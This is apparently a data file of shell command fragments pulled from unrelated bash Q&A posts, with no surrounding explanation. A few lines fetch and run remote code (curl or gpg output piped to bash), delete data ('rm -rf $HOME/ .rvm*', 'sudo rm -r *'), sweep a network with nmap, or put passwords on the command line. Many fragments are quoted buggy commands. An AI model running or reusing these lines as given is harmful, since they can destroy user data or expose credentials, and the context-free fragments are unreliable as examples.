sudo ln -s /home/somesuperuser/commonfile /home/somenormaluser/commonfile
. trap.sh|cat
echo $$
. trap.sh|cat
su restricteduser
su -l restricteduser
echo a; echo b
a; echo b
a b
printf "$file\n"
printf "$file\0"
elif quux...
elif cond3
sed 's/^<\!--//g'
composer update
for loop
declare -p combineArray
line 6: Sun: command not found
tail -1
export -f
export -f $(lsfns)
chmod a+rx doit.sh
find | while read
cat $file | wc -l
$((6 * 7))
$(expr 6 \* 7)
gpg -c <your_bash_script.sh>
gpg -d <your_bash_script.sh.gpg>
gpg -d <your_bash_script.sh.gpg> | bash
perl -e
perl -e
$(cat <<HEREDOC)
tail -f
tail -f
>/dev/null 2>&1
ls -d _clip[7-16].trim
_clip[7-9].trim _clip1[0-6].trim
(( index++ ))
[bash] select
tee /dev/fd/3
set -e
man mispipe
set -o pipefail
heroku run bash
heroku run bash
heroku run bash
complete -F _git_checkout .o
man stty
stty -a
do shell script "pwd"
osascript test.scpt
tput clear
printf \\ec
semester1 (2013).csv
this is a test
find /path -mmin +59 -type f -exec rm -fv {} \;
command_name -f variable_list
command_name -f par_name=par_value
command_name -f par_name=par_value,par_name=par_value
command_name -f par_name=par_value,par_name=par_value,par_name=par_value
GNU awk
tc -l 455
-[NSAppleScript executeAndReturnError:]
NSError **
if [[ $(find ${dir} -type f  | wc -l) -gt 0 ]]; then echo "ok"; fi
man bash
/ -gt/
flex -t lexer.l
foobar after July
tar --remove-files
ifconfig wlan3 up
ifconfig wlan3 up
mysql -u root -pmypassword -D cache -e "DELETE FROM cache WHERE job IN('SET', 'UO', 'AV');"
man bash
man bash
" "
' '
man bash
man bash
"something with $@ inside of it"
"something with $@ inside of it"
"arg1 arg2"
config hello.iso
chmod +x config
./config hello.iso
/home/your-username/bin/config hello.iso
set -x
touch "$1"
type config
echo $stringForFile > ~/.Foo/Foo.conf
SELECT domain FROM domains WHERE user='$USER'
. . .
false | true
airodump-ng 1.2 rc4
0 <= index $a, $b
$a =~ /\Q$b\E/
python -u file_name.py < input.txt
tmux show-buffer
<< EOF
export GOPATH={path_to_project}
source ~/.bashrc
alias go='GOPATH=$(echo $(pwd)) go'
cmd | cmd2 > somefile.txt
sudo service httpd restart
ssh myapp.com
cap production deploy:migrations
\curl -L https://get.rvm.io | bash -s stable
myarray=( $(command) )
if [[ -s file1.txt && -s file2.txt && -z "$(grep "^SEQADV" file3.txt)" ]]
if [[ -s file1.txt && -s file2.txt ]] && ! grep -q "^SEQADV" file3.txt
for i in {n..k}
s#^\(\s*class\s\+Process\)\(\s*{\)#\1_AlertGenerator : public BaseProcess\2#g
back references
info sed
cut -d':' -f2
rm -rf $HOME/ .rvm*
\curl -L https://get.rvm.io | bash -s stable
git rev-parse
git rev-list
git rev-parse
git tag --list
git show-ref --tags
git show-ref
git tag -l
git tag -l
basename "$f"
BOXLANMAC=$(remote_command "ifconfig eth0 | grep HWaddr | cut -d' ' -f11")
echo $BOXLANMAC,$BOXLANMAC
head -3 <(tail -f /var/log/messages)
b =''
d = $b$c$a
echo $b$
echo $b
if [bash$ expr "$i" % "$e3$ -ne 0]
if [ $(expr "$i" % "$e3$") -ne 0 ]
rm "$d" command was originally
which would just remove a file named
if/else if
[ $(expr "$1" % "$e3") -ne 0 ]
de-macro <mydocument>
sort -u
sort input | uniq -c
sort -u
uniq -c
cat login_credentials.txt /dev/stdin | python3 submit_hw0.py
cat login_credentials.txt /dev/stdin | python3 submit_hw0.py
cat /tmp/test1.txt | grep "|-1|" | cut -d'|' -f34 > /tmp/test3_1.txt
ERR=$(sort test3_1.txt | uniq -c)
awk....|column -t
# use a lot of time
'{print $'$i';}'
'print $3;}'
i == 3
SET NAMES utf8
port $i
grep port $i -
ps -ef
ps -ef|grep foo
cygpath -w /
cygpath -w /mystuff/unixstuff
wait somepid
bash -c "command here"
bash -c "source ~/setup.bash && php /www/myapp/worker.php 2>&1 | sed ... >> /your/logfile/path.log"
find . -type f -name '*.mp3' -exec file {} \;
find . -type f -name '*.mp3' -exec file {} \; | sort -n -t, +5 -6
find . -type f -name '*.mp3' -exec file {} \; | sort -t, -nk6
set -x
set -v
set -e
set -x
tail -f logfile
set -e
ls notexist || ls notexist
ls notexist
ls notexist && ls notexist
ls notexist
ls notexist
set -e
for file in "${names[@]}"
include *report*
exclude .log
shopt -s extglob
shopt -u extglob
grep ^[0-9]
cat file | grep ^[0-9] | awk '{ print }'
awk '{ print $1,$2...<and_so_on>}'
{print $0}
dos2unix file
GNU awk
if($2 !~ /Load:/)
crontab -e
ssh-agent /bin/bash
-l debug
chef-solo -c solo.rb -j node.json -l debug
bash -x script.sh
sed: 1: "d/[[:alphanum:]]+[.][[: ...": extra characters at the end of d command
\( \)
something ;; something_else
mysql -u backupuser -p'This is a terrible password with spaces' -e ...
MYPASS="'This is a terrible password with spaces'"
mysql -u backupuser -p$MYPASS -e ...
ps afx
ps aux
MASTER == "true"
> /dev/null
echo $TERM
--pretty=format:"%h - %an, %ar : %s"
GNU awk
which tclsh
set -u
set -eu
man 5 terminfo
> errorlog.txt
..]> errorlog.txt
info coreutils 'timeout invocation'
Result: John
Result: Smith
sudo rm -r *
echo | xargs -p rm
rm * .o
sudo chmod a=r+w+x del
export PATH=$PATH:/path/to/the/del/executable
source ~/.bashrc
rm ...
del ...
eval "set -n; $x"
( echo 'PS1="===COMMAND===\n"'; cat example ) | bash -i 2>&1 | ./formatter.pl
anecho b
read -r -d '' script
-d ''
$(cat <<'EOF'...EOF)
sh scriptname.sh
sleep 7
expect launchneuron.exp
sleep 5
expect launchmpj.exp
bash script.sh 5000 3 0
bash -x
bash -lx
chmod 600 ~/.my.cnf
command &
command &
man mktemp
grep -v ">"
grep -o "A" $1
expr -
Version 3.7 patchlevel 3
Version 4.6 patchlevel 3
|| true
file not found
echo 2
echo 3
find /root/backups -mtime +15 -exec rm {} \;
tail -f /var/log/syslog | grep CRON
chmod a+rwx backups
rm -fr /root/backups
/bin/rm -fr /root/backups
/bin/rm -fr /root/backups >> /root/logmeplease.log 2>&1
#!/bin/bash -l
#!/bin/bash -x
ngram.sh <infile> <outfile>
UID:number:number something
UID:\([^:]*\):\([^ ]*\).*
\( expression \)
t1ttt|/a1| = t1ttt|/a1
-bash: sudo: command not found
echo $PATH
sudo vim .bash_profile
export PATH=/usr/bin:/usr/sbin:/bin:/usr/local/bin:/sbin:/opt/x11/bin:$PATH
echo $PATH
export PATH="/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"
literal 'rn
bash script.sh &>/dev/null
(((A:__ ,B:__ ):__ ,C:__ ):__ ,D:__ )
2928's current affinity list: 0-3 2928's new affinity list: 0
's current affinity list
2928: 0-3 2928's new affinity list: 0
2928: 0-3 2928's new affinity list: 0
echo "pid 2928's current affinity list: 0-3 pid 2928's new affinity list: 0" | sed -e "s/pid //g" -e  "s/'s current affinity list//g" -e "s/(\d+)(.)(.)(.)((?:[a-z][a-z]+))(\s+)((?:[a-z][a-z]+))(\s+)((?:[a-z][a-z]+))/-->/gim"
cp /vol/examples/tutorial/science.txt .
cp ~/vol/examples/tutorial/science.txt .
fgrep -v
grep -F
grep -v "\bTelePacific\b"
grep -v
for FILENAME in *.bak
-d $
means that your input separators are NUL symbols. See how nicely the
for file in $(*.bak)
rename .bak '' *.bak
cut -d'"' -f4
sed: 1: "s/<.*?>//": RE error: repetition-operator operand invalid
cpan HTML::Strip
find /your/path -name "*.TERM"
ls /your/path/*.TERM
tail -n +2
xargs rm
& &
find . -print0
-d ''
find . -print0 | xargs -0 wc -l
wine Blockland.exe ptlaaxobimwroe -dedicated -port 30000 >> consoleLog.txt
@hourly /custom/doandmail.sh
chmod +x /custom/update
chmod +x doandmail
sed 's/"//g'
git diff --no-pager
command | cat
cat <(command)
tmux new-window script.sh
echo $BUILD_ROOT
. ./script
source script
set -x
. SETVALUES
. SETVALUES
set -x
-v c=2
-v t=35
d=($c-v>=0) ? ($c-v) : v-$c
value=(condition) ? if yes : else
abs(abs($closest - $target) - abs($target - $value)) < 1e-14
find . -name "*.fastq" -exec qiimescriptname.py {} \;
for file in data/*; do usearch32 -fastq_filter "${file}" -fastq_maxee 0.5 -fastq_truncqual 19 -fastq_qmax 45 -fastaout "${file}.fasta"; done;
xxd -r
cat -v
# test="~/dir/"
man find
find | wc
find | wc
./myscript.sh -a ARG_1 -b ARG_2 [argument ...]
/path/to/script -a ARG_1 -b ARG_2 [argument ...]
bash -c 'command'
$(echo $PATH)
build_number to
echo "\n\ncd /vagrant" >> /home/vagrant/.bashrc
cd /vagrant
vagrant ssh
cd /vagrant
echo "cd /vagrant_projects/my-project" >> /home/vagrant/.bashrc
cd /vagrant
cd /vagrant
cd /vagrant
vagrant ssh
vagrant ssh -c "cd /vagrant && bash"
vagrant ssh
cd /vagrant
chmod +x shellScriptName.sh
sh UsersInput.sh
bash UsersInput.sh
man echo
set backup
xtics add
> >(
"awk -F: '{printf "
tee /dev/tty
0 6 * * 0 /root/SST/myscript.sh
update.sh 7
0 6 * * 0 /root/SST/myscript.sh
0 7 * * 0 /root/SST/myscript.sh
0 * * * 0 /root/SST/myscript.sh
update.sh 7,8,9,10,11
0 7,8,9,10,11
crontab -l
./update.sh 8
log_user 0
log_user 1
sed -e 's, *$,,'
sed -e 'addr,addrs/reg/sub/'
find ./js/common -type f -name "*.js"
extend: 'Ext.data.Model'
and include -namespace {Extracted_Part}
and include -namespace Ext.data.Model and include -namespace Ext.Panel
"^[A-Za-z0-9 ].*="
"[A-Za-z0-9 ].*="
"/usr/bin/python2.7 /home/user/file"
java Test
E492: Not an editor command:  sed 's/\.java//')
sed 's/\.java//'
:h filename-modifiers
:h :bar
:h shellescape()
:h expand()
tr '\n' ' '
sed -e 's/[^0-9]/ /g'
-e 's/^ *//g'
-e 's/ *$//g'
tr -s ' '
sed 's/ /\n/g'
/usr/bin/php: bad interpreter: No such file or directory
chmod +x /file/location/test.sh
echo shell_exec('pwd')
> pianobarout.txt
echo "" > pianobarout.txt
yourprogram > file.txt
yourprogram >> file.txt
tail -f
yourprogram | split -b 1G - output-
which bash
M-x shell
R CMD javareconf
M-x R RET
for i in $( ls )
wc -l
for file in $(...)
while read
-d $\0
ls -a
which fab
file /usr/local/bin/fab
sed -e 's/[eE]+*/\\*10\\^/'
have amatrix images in a file
pkill <previous_pid>
kill -0 $PID
$? -ne 0
toRepl -> ${SomeText1} -> foo
set -f
su -
su root
SULOG_FILE file
SYSLOG_SU_ENABLE yes
su -
su root
grep -v [list of common lines]
man comm(1)
grep {/.*444$/}
acpitool -a
[[ ... ]]
git commit --amend
git bisect
git bisect
MSBuild.exe /M
git bisect
-n 1
./a.sh | head -3
echo 3
[[ $value =~ ^[0-9]+(\.[0-9]+)?$ ]]
[[ $value =~ ^(\.[0-9]+|[0-9]+(\.[0-9]*)?)$ ]]
-u 'USERNAME:PASSWORD'
curl -u 'dmalikov:my_password' https://api.github.com/user/repos -d '{"name":"HI"}'
tac -s=STRING filename
awk '!x[$0]++'
script.sh &
Readline Support => enabled
line 1\rline 2\n
line 2\n
col -b
PlistBuddy -c
ssh $host "/a/b/file$$$$"
ssh $host "/a/b/file54645464"
Argument list too long
sudo -s
python fabric
if fabric.sudo(sh_command) == True:
3 is a valid inequality
> 5
declare -f function_name
declare -f function_name
grep 'sometext' anyfile.txt >/dev/null
| wc -l
= foo3 =
= foo5 =
texcount Thesis.tex Introduction.tex Literature.tex Model.tex Results.tex Conclusion.Tex
mpg123 filename.mp3
mpg123 -R --fifo /srv/http/newsctl filename.mp3
[ $? -eq 0 ]
bash -c
Login failed. Password incorrect
set password {Pas\$word}
sed -i 's/\r//'
tr -d '\r'
cat ./test.txt
export LC_ALL="ru_RU.iso88595"
bash: warning: setlocale: LC_ALL: cannot change locale (ru_RU.iso88595)
echo $?
echo "Привет" > ./test.txt 
cat somefile
locale -a
sudo("sudo cp /home/myappuser/git/myapp/myapp.conf /etc/init", user='Me)
commit.sh "my commit message"
error: pathspec 'commit' did not match any file(s) known to git.
error: pathspec 'message' did not match any file(s) known to git.
git add .
git add .
Trap result code 0
git-receive-pack -> git
git $*
cut --complement -b
sed -n "/msg_sp2million/,/./p" filename.txt
GNU awk
-W posix
./test.sh abcd
GNU awk
bash --version
GNU bash, version 4.2.45(1)-release (x86_64-pc-linux-gnu)
uname -a
Linux linuxmint 3.8.0-19-generic
[ ]
[[  ]]
[ ]
' a'
[ ]
start program
sudo monit -v monitor node
; sleep xx
find . -type d
-exec touch {}/hiya \;
touch {}/hiya
printf '%s\n'
Desired output:
grep -o
sort -u
tr '\n' ' '
done < $name
cat /dev/null > $nlwd
ls -l script.sh
while read name
$(dirname $0)/library
for i in ${numarray[@]}
(( numarray[i]-- ))
sudo -u username command
man runuser
/sbin/startproc -u myUser $JAVA_HOME/bin/java
sed "/^number=/s/=.*/=5/
pgrep -xF file.pid
kill -0
kill -0
date +%H
date +%S
date +%Y-%m-%dT%H:%M:%S%z
print_and_run_command" date +%H" "Hour"
set -x
print_and_run_command" date +%H" "Hour"
print_and_run_command" date +%H"
print_and_run_command date +%H
. python
PYTHONPATH=. python
test=. python
python geddit/controller.py geddit.db
R CMD BATCH test.time.R
" %H"
cd ~/Files/Scripts/Main
hash -d <CustomName>=<RealPath>
cd ~<CustomName>
cd "$myFold"
cd myFold
rm ~/myFold
dirs -v
[: 2.41: integer expression expected
[ $(expr "$reSum > 1.5" | bc) ]
expr "2.4 > 18 | bc" // =>0
(( `echo $reSum'>='1.5 | bc` ))
sudo ovs-vsctl list-br
eCheck = 1
eCheck=$(echo "scale=1;$newY%2" | bc)
281 % 2
[[ ... ]]
goto(x, y)
git status
Write-Host text @arguments
"$@" = "$1" "$2"..."$n"
"S*" = "$1$2...$n".
~./my_script par1 par2 par3
./my_c $@
ARGV[1] == "par1"
ARGV[2] == "par2"
ARGV[3] == "par3"
./my_c $*
ARGV[1] == "par1 par2 par3"
export -f quit
export -f hello
chmod +x script.sh
source example
grep "|" textfile.txt > output.txt
regex="AAA \(bbb .+\) CCC"
whereis <scriptname>
prepare_data_matlab( 'A' )
prepare_data_matlab( 'B' )
prepare_data_matlab( 'A' )
prepare_data_matlab( 'A' )
prepare_data_matlab( 'B' )
path_to_data = /tmp/
f = data_out.txt
tree |& less
2>&1 |
2>&1 |
while read...
man echo
emacs &
man jobs
emacs --help
emacs --batch
emacs --execute
emacs &
M-x shell
M-x compile
M-x gdb
-f fabfile
sort -rg
ls: *.xyz: No such file or directory
ls > dirlist 2>&1
ls 2>&1 > dirlist
>file 2>&1
2>&1 >file
ls -al *.xyz &>files.lst
procmail -Yf-
"The value of var is $var"
echo $old
declare -p
for image in *.jpg *.JPG *.jpeg *.JPEG *.png *.PNG
for f; do
When i "vi" the file the bottom has this - "sample.text" 1L, 1C
expect -c
( )
wget url
$(echo foo)
bash foo
"$( dirname "${BASH_SOURCE[0]}" )"
bash ../foo
bash /some/path/foo
"$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
home/nmsadm/tngVersion/iconTestNetworkGenerator.sh: No such file or directory
HTTP/1.1 404
shell expansion
Shell Expansions
flock -s 200
(...) 200>/var/lock/mylockfile
flock -s 200
ls -1
ls | wc -l
LOAD DATA INFILE
LOAD DATA INFILE
find . -depth -name *.asc -exec gzip -r9 {} +
tar -zc -f test.tar.gz --exclude='*.xdr' *
echo "$(tput setaf 1)foo$(tput sgr0) bar"
<command-producing-colorful-output> | ./strip-escape-codes.sh
 | sed "s/\x0f//g"
"$(tput sgr0)"
TERM=xterm-mono ./somescript
pacman -S $all
pacman -S apple mcintosh banana plantain coconut cashew
pacman -S $first $last
pacman -S apple mcintosh coconut cashew
read -a
tee "$logfile"
echo $vowels
achoo eew
$a $e
echo $consonants
bah clap dong
$b $c $d
achoo eew
sed -i
ssh -T user@hostname 'sudo su -' < script.sh
man test
echo -e
git gc
git gc
script -q -c 'git gc' > log
script -q -c 'git gc' | sed 's/\r.*//g' > log
git gc
git gc
foo.sh "a b"
bar.sh a b
foo2.sh "a b"
bar.sh "a b"
ocrscript.sh -f /home/kristoffer/test.png -t /home/kristoffer/test.txt
man 5 crontab
ls /dev/shm/${tempThumb}*.jpg
deactivate nondestructive
source ~/.bash_profile
import sys
find -exec
cat * > 0.txt
git checkout
git checkout
git checkout -b
git magic <branch name>
git show-ref --verify refs/heads/<branch name>
git checkout
> /dev/null
Updating password for user admin
echo $var
sh sample.sh --id var1 --value var2
expr match
du s | { read a b; echo $a; }
du file | read size filename
./a.out 1>/dev/null 2>&1
./a.out 2>&1 1>/dev/null &
echo "$output"
echo {a,b,c,d}_{0..3}
a_0 a_1 a_2 a_3 b_0 b_1 b_2 b_3 c_0 c_1 c_2 c_3 d_0 d_1 d_2 d_3
a_0 b_0 c_0 d_0 a_1 b_1 c_1 d_1 a_2 b_2 c_2 d_2 a_3 b_3 c_3 d_3
print {a,b,c,d}_${^=${$+0 1 2 3}}
ANSI/VT100 terminal escape sequences
Prerequisite: ldapscripts package, Version: 2.0.1-1
uname output: Linux 3.2.0-4-amd64 #1 SMP Debian 3.2.41-2+deb7u2 x86_64 GNU/Linux
Could not guess user
Could not guess user
cannot guess user
description=$(ldapfinger "$user" |grep description |cut -d: -f2)
Cannot guess user
bash -c
* * * * * root /path/to/script.sh<&0
Cannot guess user
* * * * * USER=myuser ldapid
END{print ""}
if condition
alias foo
$(basename ...)
make allsh/allmake V=
gksudo <your command>
arg_1 arg_2 arg_3 arg_4
nmap -sn 168.1.1.0-255
nmap -sn 192.168.1.0-255
-exec mv {} ...
while read -r file
cd sub
cd main/sub
./a.out > output
{print $1}
gnuplot continuous.gp
every five minutes
ssh keys
while true; do top; done
Cordova v3.0.0
which android
cordova platform add android
which android
awk '{print $2}'
grep [s]omeprocess
awk '{print $2}'
$(ps ..)
pkill someprocess
#!/bin/bash -vx
set -x
<( … )
[ "$VAR" -gt 0 ]
help return
__fail_fast=x do-something-complex
~/.bash_profile (macOS) or ~/.bashrc (linux)
echo $YOUR_VAR >> filename
grep -o
wc -l
wc -c
outputText=$(s3cmd sync --recursive --delete-removed --config="$HEMMAPPEN/.s3cfg" "$SOURCEFOLDER" "$TARGETFOLDER/" 2>&1;echo ,$?)
status=$(s3cmd sync --recursive --delete-removed --config="$HEMMAPPEN/.s3cfg" "$SOURCEFOLDER" "$TARGETFOLDER/" > /dev/null 2>&1;echo $?)
set -e
set -e
set +e
set -e
set -e
set +e
{ echo A; echo B; echo C; }
TAG <optional description>
find ${destpath} (( -iname "${mFile##*/}" )) -o (( -iname "${mFile##*/}" -a -name "*[],&<>*?|\":'()[]*" )) -exec printf '.' \;| wc -c
find ${destpath} -iname "${mFile##*/}" -exec printf '.' \;| wc -c
find ${destpath} -iname "${mFile##*/}" -exec printf '.' \;| wc -c
find ${destpath} -name "*[],&<>*?|\":'()[]*" -exec printf '.' \;| wc -c
g' options to 
paste filea.txt fileb.txt > new.txt
IF EXISTS
Table already exists
IF NOT EXISTS
if exists
IF EXISTS
... 2>/dev/null
read -r
RESP:0,CPL-E1014:RESPMSG,System internal error;
echo $test | cut -d";" -f2
After.sh 5327 shutdown 0
After.sh "5327 5778 5935" shutdown 0
for: command not found
sh ${*:2}
eval ${*:2}
for f in *; do echo $f; done
sort -n "datafile"
sort -n file
awk '{if (a!=$1) {print ""} a=$1}1'
k = 3
sed -r
sed -E
myscript 2
?# -ge 3
this.data, that.data and so.data
./myscript  file.conf *.data dest_foder
./myscript file.conf this.data that.data so.data dest_foder
./myscript  file.conf '*.data' dest_foder
./myscript  file.conf \*.data dest_foder
-d dest_folder
print $0
exit 127
-u -m -p
xilinx ise
xilinx ise
yum install nano > /dev/null
yum install nano &> /dev/null
( command1; command2; )
man yum
>/dev/null 2>&1
command > /dev/null
command > /dev/null 2>&1
wget -d --header="User-Agent: Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11"' http://website.com -O index
{ list; }
export LINES COLUMNS
stty size
-u 0
## START UPSTREAM
## END UPSTREAM
bash file.sh
bash file.sh
ln -s ~/path-to/shell-script ~/bin
du -sh
awk -F= '...' test.txt
BEGIN { max = -inf }
{ if ($3 > max) { max = $3; line = $0; } }
END { print line }
vim w
vim work.
vim work.t
vim work.tex
-tile 10x10
Out of memory
awk '/[^0[:blank:]]/' file
awk '{for (i=1;i<=NF; i++) $i="^"$i}1' <<< "$d"
echo "${line[@]}"
echo $line $v
grep -v
ftp "$HOST"$3"/"$2"/"
ssh -P port
ssh -S program
man sftp
systemctl start service-name
systemctl start
git push
shopt -s globstar
<2-10 digits> ; word
sed -i
df -h
sudo umount /dev/<something>
expr: non-integer argument
dshback -c
dshback -c
grep '[^0-9{}., ]'
for i in $(<filea.txt)
-z string
test -z
man sh
man test
-z string
in $@
in words
in $@
while( <STDIN> )
perldoc perlopentut
[[ ... ]]
mycommand -in <imagebasename>.jpg -out <imagebasename>.tif --otherparam paramvalue
cp A A2
diff -u A A2 > patA
patch B <patA
sudo gedit /usr/share/applications/eclipse.desktop
Exec=bash -ic "/usr/bin/eclipse"
bash -i
-c ""
if [[ $EUID -ne 0 ]]; then
adb logcat
#! /bin/bash
return false
man nslookup
man join
man sort
ARGC and ARGIND
[start a command]
[start a command]
| while ...
while read line; do ...; done
sed 's/<field number=\'(.*?)\'.*?type=\'(.*?)\'/\1 \2
while read
;te.xt =
sed -e 'streetlight'
condition1 {body1} condition2 {body2} ...
php -c
php -v
whereis php
FORMAT="%-4s  %-32s \\ \n"
FORMAT="%-4s  %-32s \\"
readlink -m
while getopts
label: "A
IOError: [Errno 32] Broken pipe
java scalaProg.Pkg
java scalaProg.Pkg
java scalaProg.Pkg
python py_prog.py
java scalaProg.Pkg
__name__ == '__main__'
lost sys.stderr
head -1
java scalaProg.pkg
lost sys.stderr
python -c 'print "foo\n"*10000' | head -1
wget -q -T 60 --retry-connrefused -t 5 --waitretry=60 --user=ftp2.company.com|company2013 --password=!company2013 -N -P data/parser/company/ ftp://ftp2.company.com/Production/somedata.zip
wget: missing URL
bash: !company2013: event not found
ABC XYZ
# nextval tablename
awk: backslash not last character on line
sed /pattern/d
awk -F\$
cat myfile.txt | head -n $(($(wc -l)-1))
head -n -1
head -n -1
echo $(($(wc -l)-1)) <myfile.txt
echo $(($(wc -l <myfile.txt)-1))
brew install coreutils
brew info coreutils
-s 50M
man zip
git diff --cached --name-only --diff-filter=AM
git diff
git diff --name-only --cached --diff-filter=M
git diff --name-only --diff-filter=M
git stash -k
git stash pop
man bash
test -n
help case
$1, $2, $5
> $inFile.psv
tail -n 10 -f /var/log/httpd/error_log
shopt -s nullglob
shopt -s failglob
shopt -s nullglob
shopt -s failglob
declare -r
for i in $(<file); do echo $i; done
(sed + bc)
as is
man bash
man bash
35 53 102 342
342 102 53 35
echo $NUMBERS | ??? | tac | xargs
printf '%s\n' ...
$( ... )
sort -rn
if [ firstRun ]
gconftool-2 --set --type string --set /desktop/gnome/background/picture_filename <absolute image path>
./configure: line 1132: cmp: command not found
ls | wc -l
ls | sed 's/\./Period replaced by sed/g'
answer=$(echo $RAW|sed <YOURSTUFF>)
\ls | wc -l
ls ... | wc ...
> sorted.txt
find -maxdepth 1 -type f -iname '*key*'  -not -name '*~' -exec cat {} \; | sort
find -maxdepth 1 -type f -iname '*key*'  -not -name '*~' | xargs cat | sort
cat $(find -maxdepth 1 -type f -iname '*key*'  -not -name '*~') | sort
count = $((count+1))
if[ ...
unexpected (
man test
man bash
sudo gem install addressable
calc   201
GNU awk
fox dog monkey
[[ ... ]]
Ctrl + D
wc -l
for ... $(...)
while read
while read -d\$0 ...
while read -d\$0...
while read
firefox -P <profile-name> -no-remote
profile 1
profile 2
iwconfig wlan0
Mode: Managed
var = $(iwconfig wlan0 | grep -v 'Mode: Managed')
sed "|"stackov/er;flo.w users are great"|i\proud sta{ckov,er member" file
bash -i
GNU awk
curl --data "name=$name_user" http://dns1.example.com > /path/to/outputFile
grep "tar"
grep '\.tar$'
bash -x HelloWorld.sh
#!/bin/bash -x
set -x
set +x
readlink en_US/LC_COLLATE
bash -n script.sh
bash -n script.sh
bash -n check.sh; echo $?
./check.sh: line 4: unique_id: readonly variable
jake killall
ps aux | grep [p]rocess\ name | {HOW DO I GET THE PID NOW?}
kill -9 {PID HERE}
killall <program>
pkill <program>
pgrep <program>
syntax error near unexpected token elif [[ "$line2" = "moon" ]]
[[ ]]
man bash
` `
pre-xfer exec
post-xfer exec
sed "s/\(.\{9\}\).\{6\}//"
tr -s " "
cut -d" " -f1,3
awk '$2="";7'
login shell
interactive shell
ps -f
su -l minecraft
read THIS
regex =/= glob
ab+(any number of b)+c
man grep
od -c
-F " "
FS = " "
cd ..
builtin pwd
cd ..
cd $i
set -o errexit
cd ..
Believe.....Right Now
tr -d
tr '.....' ' '
-i, --in place
convert -loop 0 -delay 10 *.gif out.gif
branch=$(git symbolic-ref --short -q HEAD)
fatal: Not a git repository (or any of the parent directories): .git
echo $branch
git symbolic-ref --short -q HEAD
git push origin $branch
cd ~/a
cd ~/b
set backupdir=$VIM/backup
:help backup
:h 'bk'
:h 'wb'
:h 'bex'
String[] cmdarray
sort largefile |uniq -c >outfile
awk '!arr[$1]++' largefile >outfile
sort | uniq
realpath <filename>
$(basename {})
removing: "$INCRBACKUPDIR/$(basename {})
removing: "$INCRBACKUPDIR/{}
ls -l
-exec bash
bash script.sh < file
xx00 xx01 xx..
man bash
<(echo string)
sed 's/"/\\"/g'
git svn fetch -r
git fetch
sed -ne \"s/\\s//p\"
sed -ne \"s/\\\\s//p\"
push onto
SAMPLE FILE.txt
git archive
bash script.sh /dev/yourdevice1 [/dev/yourdevice2]
bash script.sh /dev/sdc /dev/sdd1
VPN Connection
man nmcli
if [ *ldapsearch query* == True];then
memberUid: testuser
[ -z "$string" ]
grep -v -f file2 file1
<( )
diff -u
<(sort ...)
comm - compare two sorted files line by line
wc -l
diff -y --suppress-common-lines file1.txt file2.txt
bash script.sh
$(dirname "$files")
-maxdepth 1
-wholename "$files"
-mtime -30
wc -l
on_picture_save echo "Motion Detected at %Y-%m-%d %T" | mail -a %f -s "Subject user@example.com
bash import.sh
bash script.sh
which ruby
#!/usr/bin/env ruby
sh ruby_script
require: command not found
sh ruby_script
sh ruby_script
ruby ruby_script
Total users:
bash my_script.sh 2>&1 | tee log.txt
bash my_script.sh 2>&1 | tee -a log.txt
2: [: Illegal number:
id -u
id -u
[... = ...]
[[... == ...]]
id -u
id -u
id -u
id -u
mkdir -vp ~/app/init
#!/bin/su root
/bin/bash ./some_script.(b)sh
umask 777
sudo scriptName
su root
sudo commandInScript
I am nobody user
I am user
I am <USER> user
echo 'I am '.exec('echo <PASSWD> | sudo -S -u <USER> whoami').' user';
jobs -l
ps -p <pid>
ps -u "$USER"
ps -u "$(whoami)"
paste -d $'\n'
varname=value command
IFS= read -r -d $'\0'
read -r -d $'\0'
[ ... ]
[[ ... ]]
-d $'\0'
-d ''
echo $'a\0b'
[[ ...]]
[[ $foo = bar ]]
echo eval $mycmd
eval cat $myfile
eval cat afile.txt
for item in ${SLAVE_ARR[*]}
./bashexample 'J37264'
ps -ef
`while read line; do echo $line; done < TEST.txt`
"`while read line; do echo $line; done < TEST.txt`"
echo $line
$i == 'shop'
docker exec -i container_name psql -U postgres -d postgres -c "$SQL_COMMAND"
tr -d [:punct:]
command pwd
cd $NDK
source .bashrc
for f in *.mov; do ffmpeg -i "$f" -vcodec copy -acodec copy "/desination/${f%.mov}.mp4"; done
ls -A
cd 1.1
"PanicA1" is not in Varaiable2
{if (/header/) {h=$0; a[h]=0} if (/text/) {a[h]++}}
END{for (i in a) {print i" "a[i]}}
bash executed command
execute remote command
print $1
-U username
echo "AHHH THAT'S ALREADY THERE"
INSERT IGNORE
2> /dev/null
awk 'NR>1{print $20,$45,$102}' RS='vector'
start_sim.sh script
export ROBOT=robot
source start_sim.sh
Content-Type: multipart/alternative
Content-Type: text/plain
Content-type: multipart/alternative
Content-Type: text/html
echo -e "MIME-Version: 1.0\nContent-Type: text/plain\n\n"
set -x
onintr -
onintr -
bash -c
csh -c
trap "" 2
bash -c
csh -c
onintr -
bash -i
bash -i
cat ~/Desktop/myfile.txt | sed s/:/\\n/
sed ... file
cat file | sed
<< !
mv -n
java -jar
set -o vim
sudo /path/to/my/script.sh arguments
sudo service incrond status
restorecond -R /usr/sbin/incrond /etc/incron*
service incrond stop
service incrond start
service incrond restart
yum remove incron
yum install incron
chkconfig incrond on
sudo reboot
/tmp/ IN_ALL_EVENTS echo boo>>/home/myusername/boofile.txt
service incrond status
incrond (pid  xxxx) is running...
Aug 14 15:05:30 hostname incrond[1584]: (root) CMD (sudo /path/to/DropFolder/script/subfolder/script-Beta-1.sh /home/username/DropFolder/testfile.file)
echo > /dev/pts/0
S=(true false)
(( ))
[[ ]]
wc -l
find . -maxdepth 1 -type f -exec mv {} destination_path \;
find: missing argument to -exec
imagemagick import -window $WINDOWID
man 1p sh
-f foo -o x
echo $?
help [
man [
-f foo -o x
-f foo -o x
home :
echo "$BASH_VERSION"
export PS1='$(top_level_dir) : '
export PS1="$(top_level_dir) : "
sort data
sort data
sort +1n data
sort data
-k 2
-k2 -n
[[ $VAR != "" ]]
! [ "$VAR" = "" ]
sed -ne '/^$/!p' file
... | sed -ne '/^[[:space:]]*$/!p
GNU parallel
GNU parallel
bash -c
export mypath="pwd"
nano ~/.bashrc
export mypath="pwd"
sort -u
ls -l
echo "test"
sh test.sh
Welcome {0..10} times
bash test.sh
ls -l /bin/sh
declare -A arr
${array[$key]} -> ${array[index]} -> ${array[3]}
set -o nounset
declare -a
declare -A
declare -A
declare -A arr
localhost> localhost>
localhost> localhost>
hdfs dfs -ls /directory_path
grep -v 'Found'
Found x items
